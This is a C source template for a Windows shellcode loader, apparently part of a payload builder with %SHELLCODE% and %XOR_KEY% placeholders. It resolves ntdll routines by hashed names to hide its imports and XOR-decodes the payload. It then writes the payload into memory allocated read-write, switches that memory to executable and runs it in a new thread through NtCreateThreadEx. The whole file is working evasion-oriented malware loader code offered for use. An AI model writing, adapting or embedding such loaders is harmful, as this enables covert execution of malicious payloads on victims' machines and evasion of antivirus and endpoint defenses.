#include "definitions.h"


int WinMainCRTStartup() {
    unsigned char payload[] = "%SHELLCODE%";
    WORD key = %XOR_KEY%;

    SIZE_T regionSize = sizeof(payload);
    PVOID exec = NULL;
    DWORD old_protect = 0;
    HANDLE th;
    BOOL rv;

    /* TAGS todo
    FunctionHASH__functionNAME
    */

    unsigned int ndtll_hash = 0x69e00346;   // ROL17
    unsigned int virtual_alloc_hash = 0x96124679; // ROR23
    unsigned int write_memory_hash = 0x92136911; // ROR23
    unsigned int virtual_protect_hash = 0xd62f6483; // ROR23
    unsigned int create_thread_hash = 0xdd007761; // ROR23
    unsigned int wait_for_single_object_hash = 0xde23aac9; // ROR23

    HMODULE hNtdll = CustomGetModuleHandle(ndtll_hash);

    NtAllocVirtMem _NtAlocVirtMem = (NtAllocVirtMem)CustomGetProcAdress(hNtdll, virtual_alloc_hash);
    NtWriteVirtMem _NtWriteVirtMem = (NtWriteVirtMem)CustomGetProcAdress(hNtdll, write_memory_hash);
    NtProtectVirtMem _NtProtectVirtMem = (NtProtectVirtMem)CustomGetProcAdress(hNtdll, virtual_protect_hash);
    NtCreateThreadEx _NtCreateThreadEx = (NtCreateThreadEx)CustomGetProcAdress(hNtdll, create_thread_hash);
    NtWaitForSingleObj _NtWaitForSingleObj = (NtWaitForSingleObj)CustomGetProcAdress(hNtdll, wait_for_single_object_hash);


    // Allocating executable memory
    _NtAlocVirtMem((HANDLE)-1, &exec, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    XOR(payload,sizeof(payload),key);

    // Copy shellcode into allocated memory
    _NtWriteVirtMem((HANDLE)-1, exec, payload, sizeof(payload), NULL);

    // Changing memory protection to PAGE_EXECUTE_READ
    _NtProtectVirtMem((HANDLE)-1, &exec, &regionSize, PAGE_EXECUTE_READ, &old_protect);

    // Executing shellcode in a new thread
    _NtCreateThreadEx(&th, GENERIC_ALL, NULL, (HANDLE)-1, exec, NULL, FALSE, (ULONG_PTR)NULL, (SIZE_T)NULL, (SIZE_T)NULL, NULL);

    // Waiting for thread to finish
    _NtWaitForSingleObj(th, FALSE, NULL);

    return 0;
}

